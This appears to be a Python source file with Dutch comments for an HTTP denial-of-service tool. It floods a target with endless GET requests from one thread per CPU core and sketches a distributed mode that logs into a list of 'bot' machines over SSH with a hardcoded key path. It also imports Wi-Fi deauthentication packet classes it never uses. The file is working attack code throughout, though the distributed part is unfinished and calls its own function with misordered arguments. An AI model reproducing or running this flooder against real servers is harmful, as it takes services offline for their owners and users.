import socket
import threading
import random
import psutil
import paramiko
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap
from scapy.sendrecv import sendp

# Functie om het maximale aantal CPU-cores te verkrijgen
def get_max_cores():
    max_thread_count = psutil.cpu_count(logical=True)
    return max_thread_count

# Functie die een Denial of Service (DoS) aanval uitvoert met HTTP GET-verzoeken
def http_dos(target_host,target_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Een TCP-socket maken
    sock.connect((target_host, target_port))  # Verbinding maken met het doel-IP en de poort
    while True:
        try:
            # Een HTTP GET-verzoek verzenden naar het doel
            sock.send(f"GET /index.html HTTP/1.1\r\nHost: {target_host}:{target_port}\r\n\r\n".encode())
        except Exception as e:
            # Als er een fout optreedt, de aanval opnieuw starten
            http_dos(target_host,target_port)

# Functie om de DoS-functie uit te voeren met meerdere threads
def execute_http_dos(target_host,target_port):
    max_thread_count = get_max_cores()  # Het maximale aantal beschikbare CPU-cores verkrijgen
    for i in range(0, max_thread_count):
        try:
            thread = threading.Thread(target=http_dos, args=(target_host,target_port))  # Een nieuwe thread maken voor elke aanval
            thread.start()  # De thread starten
            print(f"Thread {i} started (http)")  # Afdrukken dat de thread is gestart
        except Exception as e:
            print(f"Error: {e}")

def load_target_bot_list(file):
    bot_list = []
    with open(file, "r") as file:
        for line in file:
            line=line.replace("\n", "")
            (bot_ip,bot_port, username)=line.split(":")
            bot_list.append((bot_ip, bot_port, username))
    return bot_list

### TODO: ervoor zoregndat de ddos op de bots wordt uitgevoerd
def create_ddos(ddos_type, target_host, target_port, bot_list, pvkey="/home/nvdg/.ssh/id_rsa"):
    for bot_tupple in bot_list:
        bot_ip, bot_port, username = bot_tupple

        # Create an SSH client
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        # Connect to the remote host
        private_key = paramiko.RSAKey.from_private_key_file(filename="/home/nvdg/.ssh/id_rsa",password="EMPTY" )
        ssh_client.connect(hostname=bot_ip, port=bot_port, username=username, pkey=private_key)

        # Run the Python version command remotely
        stdin, stdout, stderr = ssh_client.exec_command('python --version')

        # Check the output to see if Python is installed
        output = stdout.read().decode().strip()
        
        if output.startswith('Python'):
            print(f"Python is installed on {bot_ip}")
        else:
            print(f"Python is not installed on {bot_ip}")

        # Close the SSH connection
        ssh_client.close()

def start_dos_script(target_host, target_port, isDistributed=False, pvkey=""):
    if isDistributed:
        create_ddos(target_host,target_port,load_target_bot_list("test.txt"), pvkey)
    else:
        execute_http_dos(target_host,target_port)
